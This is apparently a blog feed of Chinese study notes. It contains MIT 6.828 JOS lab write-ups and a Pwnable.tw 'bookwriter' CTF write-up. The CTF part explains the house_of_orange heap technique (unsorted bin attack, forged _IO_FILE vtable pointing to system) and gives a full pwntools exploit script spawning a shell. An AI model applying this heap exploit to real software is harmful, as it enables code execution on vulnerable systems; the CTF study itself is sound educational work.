registers的内容，并且判断它的bit5是否为1，即发送数据缓冲区寄存器是否为空。如果为空，则计算机可以发送下一个数据给端口。而outb指令则是把要发送的数据c，发送给<code>0x3f8</code>，当<code>0x3f8</code>端口被写入值时，它是作为发送数据缓冲寄存器的，里面存放要发送给串口的数据。所以<code>serial_putc</code>函数的功能是把一个字符输出给串口。至于为什么，不知道。</p><p>然后是<code>lpt_putc</code>函数：把字符输出给并口设备。至于为什么，不知道。</p><p>接着是<code>cga_putc</code>函数：把字符输出到cga设备上，即计算机的显示屏。它首先定义了一个缓冲区，缓冲区的当前显示内容的最后一个字符的指针就是crt_pos，所以当你新输入一个字符时，你必须根据字符值的值，来输出正确的内容给这个缓冲区，然后缓冲区的内容才能正确的显示在屏幕上。比如当第8行当c为’\b’时，代表是输入了退格，所以此时要把缓冲区最后一个字节的指针减一，相当于丢弃当前最后一个输入的字符。当c为’\t’时，我要输出5个空格给缓冲区。如果不是特殊字符，那么就把字符的内容直接输入到缓冲区。而switch之后的if判断语句的功能应该是保证缓冲区中的最后显示出去的内容的大小不要超过显示的大小的界限。最后四句则是把缓冲区的内容输出给显示屏。</p><h3 id="lib-printfmt-c"><a href="#lib-printfmt-c" class="headerlink" title="/lib/printfmt.c"></a>/lib/printfmt.c</h3><p>首先看一下文件开头的注释。</p><p>“打印各种样式的字符串的函数，经常被printf，sprintf，fprintf函数所调用，这些代码是同时被内核和用户程序所使用的”通过注释，我们知道这个文件中定义的子程序是我们能在编程时直接利用printf函数想屏幕输出信息的关键。那么我们把目光锁定到被其他文件以来的<code>vprintfmt</code>子程序。程序包含四个参数：</p><ol><li><p><code>void (*putch)(int, void*)</code>：这个参数是一个函数指针，这类函数包含两个输入参数int，void*，int代表一个要输出的字符的值，void *则代表要把这个字符输出的位置的地址，但是这里void *参数的值并不是这个这个地址，而是存放这个地址的存储单元的地址。比如我想把一个字符值为0x30的字符（’0’）输出到地址0x01处，此时我们的程序应该是：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">int</span> addr = <span class="number">0x01</span>; </span><br><span class="line"><span class="number">2</span> <span class="keyword">int</span> ch = <span class="number">0x30</span>;</span><br><span class="line"><span class="number">3</span> putch(ch, &amp;addr);</span><br></pre></td></tr></table></figure></li><li><p><code>void *putdat</code>：这个参数就是输入的字符要存放的内存地址的指针，就是和上面putch函数的第二个参数一个含义。</p></li><li><p><code>const char *fmt</code>：这个参数代表你在编写类似于printf这种格式化输出程序时，你指定的格式的字符串，即printf函数的第一个输入参数，比如printf(“This is %d test”, n)，这个子程序中，fmt就是”This is %d test”。</p></li><li><p><code>va_list ap</code>：这个参数代表的是多个输入参数，即printf子程序中从第二个参数开始之后的参数，比如(“These are %d test and %d test”, n, m)，那么ap指的就是n，m。</p></li></ol><p>那么这个函数的执行过程主要是一个while循环，分为以下几个步骤：</p><ol><li><p>（92 ~ 96行）首先一个个的输出格式化字符串fmt中所有’%’之前的字符，因为它们就是要直接输出的，比如”This is %d test”中的”This is “。当然如果在把这些字符一个个输出中遇到结束符’\0’，则结束输出。</p></li><li><p>（98 ~ 243行）剩余的代码都是在处理’%’符号后面的格式化输出，比如是%d，则按照十进制输出对应参数。另外还有一些其他的特殊字符比如’%5d’代表显示5位，其中的5要特殊处理。而这个程序也是正是这个练习让我们补充的地方，在源程序的第207行~212行，这里是要处理显示八进制的格式的时候的代码：</p><p>　　我们可以参照上面显示无符号十进制的情况’u’，或者十六进制的’x’，来书写八进制的，具体原理可以看上面代码的备注，我填写代码如下：</p></li></ol><p>注：这个子程序里面涉及到一个非常重要的子函数va_arg()，其实与这个函数类似的还有2个，va_start()，va_end()，以及一个数据类型va_list。这个4个东西是为了计算机能够处理输入参数不固定的程序。比如下面这种程序的声明方式</p><p>　　　　　void fun(int arg_num, …)</p><p>其中arg_num，代表这个程序输入参数的个数(不包含arg_num本身)，而后面的省略号则指代后续所有的输入参数，我们可以在程序中调用，如下</p><p>　　　　　fun(3, 10, 20, 30)；</p><p>　　 这种能够处理可变个数输入参数的功能就是由va_list, va_arg(), va_start(), va_end()来实现的。可以参考</p><p><a href="http://www.cnblogs.com/justinzhang/archive/2011/09/29/2195969.html。">http://www.cnblogs.com/justinzhang/archive/2011/09/29/2195969.html。</a></p><h3 id="kern-printf-c"><a href="#kern-printf-c" class="headerlink" title="/kern/printf.c"></a>/kern/printf.c</h3><p>这个文件中定义了我们在编程中会用到的最顶层的一些格式化输出子程序，比如printf，sprintf等。</p><p>首先看一下最下面的cprintf子程序，它的输入是最接近于我们在编程中使用格式化输出子程序时的输入了，比如printf(“This is %d test”, n)，第一个参数为输出的格式字符串，而后面就是我要输出的一些参数。它是如何实现的呢，我们在它的内部看到a_list，va_arg(), va_start(), va_end()这组操作的使用，前面我们说过，它们是专门用来处理这种输入参数的个数不确定的情况。在cprintf中我们发现，它利用va_list，va_arg()，va_start()，va_end()这些操作，把cprintf的fmt之后的输入参数都转化为va_list类型的一个参数，然后把fmt，和这个新生成的ap作为参数传递给vcprintf。</p><p>在vcprintf中我们发现，它就是调用了我们在上面仔细分析过的vprintfmt子程序，回顾一下，介绍vprintfmt子程序时，我们说过它有4个参数，如下</p><ol><li><code>void (*putch)(int, void*)</code>：这个参数是一个函数指针，这类函数包含两个输入参数int, void *，int参数代表一个要输出的字符的值。void * 则代表要把这个字符输出的位置的地址。</li><li><code>void *putdat</code>：这个参数就是输入的字符要存放在的内存地址的指针，就是和上面putch函数的第二个输入参数是一个含义。</li><li><code>const char *fmt</code>：这个参数代表你在编写类似于printf这种格式化输出程序时，你指定格式的字符串，即printf函数的第一个输入参数，比如printf(“This is %d test”, n)，这个子程序中，fmt就是”This is %d test”。</li><li><code>va_list ap</code>：这个参数代表的是多个输入参数，即printf子程序中从第二个参数开始之后的参数，比如(“These are %d test and %d test”, n, m)，那么ap指的就是n，m。</li></ol><p>我们可以发现，刚刚得到的fmt和ap正好可以被放在第3和第4个输入参数处！</p><p>另外再看头两个参数，第一个参数是一个函数指针，这个函数必须能够实现把一个字符输出到某个地址处的功能。再看一下vcprintf中它赋给vprintfmt子程序的第一个参数是这个文件中的第一个子程序putch。</p><p>它调用了我们最开始分析的子程序，cputchar，这个子程序可以把字符输出到屏幕上。所以这个putch子程序是满足vprintfmt子程序的要求的~可以作为参数传递给它。最后再看第二个参数，这个参数在这里就不具备内存地址的含义了，我们看到在putch里面，它只是把字符输出给屏幕，然后把这个cnt加1，并没有把字符存放到cnt所指向的地址处，所以这个cnt就变成了一个计数器。记录已经输出了多少的字符。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;我们丢弃了一小部分代码—即当我们在printf中指定输出”%o”格式的字符串，即八进制格式的代码。尝试去完成这部分程序。&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise7</title>
    <link href="https://billyotry.github.io/2021/02/01/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise7/"/>
    <id>https://billyotry.github.io/2021/02/01/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise7/</id>
    <published>2021-02-01T03:29:34.516Z</published>
    <updated>2021-02-01T04:04:25.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>使用Qemu和GDB去追踪JOS内核文件，并且停止在movl %eax, %cr0指令前。此时看一下内存地址0x00100000以及0xf0100000处分别存放着什么。然后使用stepi命令执行完这条命令，再次检查这两个地址处的内容。确保你真的理解了发生了什么。如果这条指令movl %eax, %cr0并没有执行，而是被跳过，那么第一个会出现问题的指令是什么？我们可以通过把entry.S的这条语句加上注释来验证一下。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们断点到0x10000C处，因为我们在之前的练习中已经知道了，0x10000C是内核文件的入口地址。然后我们从这条指令开始一步步运行，直到碰到<code>movl %eax, %cr0</code>指令。在这条指令运行之前，地址0x00100000和地址0xf0100000两处存储的内容是：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117156842/0" alt="image-20210201113700194"></p><p>可见两地址处的值是不一样的。</p><p>当执行完<code>movl %eax, %cr0</code>后，在查看两个位置：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117174931/0" alt="image-20210201114135742"></p><p>我们会发现两处存放的值已经一样了！ 可见原本存放在0xf0100000处的内容，已经被映射到0x00100000处了。</p><p>第二问需要我们把entry.S文件中的<code>%movl %eax, %cr0</code>这句话注释掉，重新编译内核。我们需要先make clean，然后把<code>%movl %eax, %cr0</code>这句话注释掉，重新编译。 再次用qemu仿真，并且设置断点到0x10000C处，开始一步步执行。通过一步步查询发现了出现错误的一句。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117250200/0" alt="image-20210201115806186"></p><p>其中在0x10002a处的jmp指令，要跳转的位置是0xf010002C，由于没有进行分页管理，此时不会进行虚拟地址到物理地址的转化，所以报错。也就是说此时的虚拟地址就当成了物理地址，但是我们知道我们的物理地址肯定没有这么大的地方，所以报错了。下面是make qemu-gdb中的信息</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13117260785/0" alt="image-20210201120017641"></p><p>可见当前访问的逻辑地址超出内存。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;使用Qemu和GDB去追踪JOS内核文件，并且停止在movl %eax, %cr0指令前。此时看一下内存地址0x00100000以及0xf0
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise6</title>
    <link href="https://billyotry.github.io/2021/01/31/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise6/"/>
    <id>https://billyotry.github.io/2021/01/31/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise6/</id>
    <published>2021-01-31T01:35:16.251Z</published>
    <updated>2021-01-31T01:37:58.265Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>在这个练习中，我们将尝试使用GDB的x命令（查看内存命令）。 x/Nx ADDR。这个指令将打印出从ADDR地址开始之后的N个字的内容。重启一下Qemu。在Bios进入boot loader之前，内存地址0x00100000处8个字的内容，然后进入boot loader运行到内核开始处停止，再看下这个地址处的值。为什么二者不同？第二次这个内存处所存放的值的含义是什么？</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在进入boot loader之前，从内存地址0x00100000处开始之后8个字的内容为：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13112362486/0" alt="image-20210131093712110"></p><p>在进入kernel那一刻之前，从内存地址0x00100000处开始之后8个字的内容为：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13112363411/0" alt="image-20210131093733615"></p><p>为什么会产生这种变化，因为bootmain函数在最后会把内核的各个程序段送入到内存地址0x00100000处，所以这里现在存放的就是内核的某一个段的内容，由于程序入口地址是0x0010000C，正好位于这个段中，所以可以推测，这里面存放的应该是指令段，即.text段的内容。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;在这个练习中，我们将尝试使用GDB的x命令（查看内存命令）。 x/Nx ADDR。这个指令将打印出从ADDR地址开始之后的N个字的内容。重启
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise5</title>
    <link href="https://billyotry.github.io/2021/01/30/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise5/"/>
    <id>https://billyotry.github.io/2021/01/30/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise5/</id>
    <published>2021-01-30T14:39:18.216Z</published>
    <updated>2021-01-31T01:34:47.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>再一次追踪一下boot loader的一开始几句指令，知道第一条满足如下条件的指令处：</p><p>当我修改了boot loader的链接地址，这个指令就会出现错误。</p><p>找到这样的指令后，把boot loader的链接地址修改一下，我们要在boot/Makefrag文件中修改它的链接地址，修改完成后运行 make clean， 然后通过make指令重新编译内核，再找到那条指令看看会发生什么。 最后别忘了改回来。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题希望我们修改boot loader的链接地址，在Lab 1中，作者引入了两个概念，一个是链接地址，一个是加载地址。链接地址可以理解为通过编译器链接器处理形成的可执行程序中指令的地址，即逻辑地址。加载地址则是可执行文件真正被装入内存后运行的地址，即物理地址。</p><p>那么在boot loader中，由于在boot loader运行时还没有任何的分段处理机制，或分页处理机制，所以boot loader可执行程序中的链接地址就应该等于加载地址。在Lab中作者说，BIOS默认把boot loader加载到0x7C00内存地址处，所以就要求boot loader的链接地址也要在0x7C00处。boot loader地址的设定是在boot/Makefrag中完成的，所以根据题目的要求，我们需要改动这个文件的值。</p><p>　　首先按照题目要求，在lab目录下输入make clean，清除掉之前编译出来的内核可执行文件，在清除之前你可以先把 obj/boot/boot.asm文件拷贝出来，之后可以用来比较。然后打开这个boot/Makefrag文件，我们会发现下列语句：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13112346066/0" alt="image-20210131093057268"></p><p>其中的-Ttext 0x7C00，就是指定链接地址，我们可以把它修改为0x7E00，然后保存退出。</p><p>　　然后在lab下输入make，重新编译内核，首先查看一下obj/boot/boot.asm，并且和之前的那个obj/boot/boot.asm文件做比较。下图是新编译出来的boot.asm：</p><p>由于BIOS会把boot loader程序默认装入到0x7c00处，所以我们还是再0x7C00处设置断点，并且运行到那里，我们发现前几条命令依旧是正常的，直到运行到<code>lgdtw 0x7e64</code>。这条指令我们之前讲述过，是把指令后面的值所指定内存地址处后6个字节的值输入全局描述符表寄存器GDTR，但是当前这条指令读取的内存地址是0x7e64，我们在图中也展示了一下这个地址处后面6个单元存放的值，发现是全部是0。这肯定是不对的，正确的应该是在0x7c64处存放的值，即图中最下面一样的值。可见，问题出在这里，GDTR表的值读取不正确，这是实现从实模式到保护模式转换的非常重要的一步。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;再一次追踪一下boot loader的一开始几句指令，知道第一条满足如下条件的指令处：&lt;/p&gt;
&lt;p&gt;当我修改了boot loader的链接
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>[Pwnable.tw]bookwriter</title>
    <link href="https://billyotry.github.io/2021/01/29/[Pwnable.tw]bookwriter/"/>
    <id>https://billyotry.github.io/2021/01/29/[Pwnable.tw]bookwriter/</id>
    <published>2021-01-29T10:38:39.001Z</published>
    <updated>2021-01-29T11:42:30.511Z</updated>
    
    <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec main</span></span><br><span class="line">[*] &#x27;/home/C7/\xe6\xa1\x8c\xe9\x9d\xa2/tw/bookwriter/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line"><span class="meta">$</span><span class="bash"> strings libc_64.so.6 | grep GNU</span></span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">GNU Libidn by Simon Josefsson    </span><br></pre></td></tr></table></figure><p>最近在学house_of_orange技术。这道题算是自己的第一次实践，但是本地能通，远程不知道为什么不行。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先这题的题目逻辑都很清楚，添加书页，浏览，编辑书页，查看信息功能。首先我们要知道的是house_of_orange技术我们需要heap地址，libc地址，以及libc 2.23及一下版本。</p><p>house_of_orange思路就是：</p><ol><li>首先修改<code>top_chunk</code>的<code>size</code>，然后再申请一个大的<code>malloc</code>（大于当前的<code>top_chunk</code>的大小，小于<code>mmap</code>的阈值），当修改的<code>top_chunk</code>满足条件时，这时我们原来的<code>top_chunk</code>就会被放入<code>unsorted bin</code>。</li><li>通过堆溢出修改原来top_chunk的内容，主要是伪造<code>IO_file_plus</code>指针的虚表，并伪造bk指针为unsorted bin attack攻击做准备。</li><li>当再次申请内存时，造成<code>unsorted bin attack</code>，将<code>_IO_list_all</code>覆写为<code>main_arena+88</code>，由于unsorted bin结构的破坏，程序异常，会在<code>malloc</code>中调用<code>malloc_printerr</code>函数进行错误打印，再<code>malloc_printerr</code>中调用<code>__libc_message</code>，进一步调用<code>abort()</code>，再调用<code>_IO_flush_all_lockp</code>，在其中调用_<code>IO_OVERFLOW(fp，EOF)</code>，这个函数就是使用虚表调用，如果可以覆盖调用的虚表，就可以达到提权的目的。</li></ol><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul><li>我们可以看到存放name的地方于存放chunk指针的地方是一起的，并且信息是用%s打印的，当我们填满name后，也就是name和chunk指针之间是没有’\x00’的，那么在打印name的时候可以将chunk指针也就是heap地址一起打印出来</li><li>这里的溢出其实有两处。第一处在edit函数中，程序使用<code>strlen</code>函数，我们知道<code>strlen</code>这类字符串函数遇到’\x00’才会截断，当我们申请的chunk复用下一个chunk的pre_size字段的时候，我们的content就可以和下一个chunk的size连起来，也就是<code>strlen</code>的结果就是输入的长度+下一个堆块的size。第二处在add中，这里存放chunk指针的数组的最后一个和存放chunk的大小的数组的第一个其实是重合的，也就是当索引为0的chunk处如果放的是最后一个chunk的地址，那么此时索引为0的chunk的size就会非常大，那么就会造成溢出。本来这里是没法写入一个chunk地址的，因为我们的chunk0的size存放在此，不满足<code>!(&amp;qword_6020A0)</code>，但是如果我们的chunk0的内容是’\x00’开头，strlen会遇’\x00’截断，在他更新size大小的时候就会将size写为0，那么就能满足<code>!(&amp;qword_6020A0)</code>。</li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>由于这里的重点是IO_FILE的利用，那么只调试处关键的地方。</p><p>首先我们将top_chunk的size修改。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105821693/0" alt="image-20210129191049835"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105825502/0" alt="image-20210129191139571"></p><p>这里是size块覆写要满足3点要求，top chunk才能被释放到unsorted bin中</p><ol><li>size &gt;= MINSIZE</li><li>pre_inuse位为1</li><li>top_chunk地址 + size - 1是页对齐的</li></ol><p>当满足上面之后再次申请一个较大的堆块的时候就会将其放入unsorted bin中</p><blockquote><p>这里值得注意的是在打印信息的函数中存在scanf函数，scanf内部会申请一个0x1000大小的块，且不释放，就可以达到将原来的top_chunk释放到unsorted bin的目的</p></blockquote><p>将放入unsorted bin的chunk切割后，就能泄露出libc地址。</p><p>接下来就可以堆溢出构造unsorted bin attack了。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105871998/0" alt="image-20210129192316783"></p><p>我们看到我们将<code>_IO_list_all</code>修改为了main_arena+88，但是这里我们不是全部可控的，我们为了能够达到全部可控就要控制他的_chain字段，这个字段会指向下一个结构体，我们可以控制这个字段指向我们可控的内存中，这样就可以达到伪造一个IO FILE，可以通过将原来的top_chunk挂在fastbin的方法来进一步利用。我们只需要将原来的top_chunk改为0x61，然后bk改为<code>_IO_list_all-0x10</code>。当我们通过malloc创建堆块的时候，由于unsorted bin中的堆块不唯一，就会把unsorted bin中的堆块释放到bin中去，释放原来的top头时，会把该块挂在到fastbin[4]，也就是我们期待的位置，然后再处理bk指针，也就是<code>_IO_list_all</code>，会触发堆块大小为0的错误，进一步触发malloc_printerr等一系列函数。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105944849/0" alt="image-20210129193610700"></p><p>可以看到此时伪造的<code>_IO_file_plus</code>结构体，满足：</p><ol><li>mode = 0</li><li>write_ptr &gt; write_base</li></ol><p>并且vtable是我们伪造好的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105957419/0" alt="image-20210129193831189"></p><p>最终调用的虚表函数<code>_IO_OVERFLOW</code>被我们修改成了system，最终malloc一个堆块即可触发漏洞。</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;chall.pwnable.tw&#x27;,10304)</span></span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc_64.so.6&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of page :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(yes:1 / no:0) &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    <span class="keyword">if</span>(num):</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Author :&#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">chunk_prt = <span class="number">0x6020A0</span>        </span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x17</span>+p64(<span class="number">0xfe1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content :\n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c5178</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system= &quot;</span>+<span class="built_in">hex</span>(system)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;IO_list_all= &quot;</span>+<span class="built_in">hex</span>(IO_list_all)</span><br><span class="line">main_arena_88 = libc_base + <span class="number">0x3c4b20</span> + <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_arena_88= &quot;</span>+<span class="built_in">hex</span>(main_arena_88)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>+<span class="number">0x90</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(main_arena_88)+p64(IO_list_all-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">21</span></span><br><span class="line">vtalbe = heap_base + <span class="built_in">len</span>(payload)+<span class="number">0x10</span></span><br><span class="line">payload+=p64(vtalbe)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;检查&quot;&gt;&lt;a href=&quot;#检查&quot; class=&quot;headerlink&quot; title=&quot;检查&quot;&gt;&lt;/a&gt;检查&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】IO FILE之劫持vtable及FSOP</title>
    <link href="https://billyotry.github.io/2021/01/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91IO%20FILE%E4%B9%8B%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/"/>
    <id>https://billyotry.github.io/2021/01/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91IO%20FILE%E4%B9%8B%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/</id>
    <published>2021-01-26T15:33:16.586Z</published>
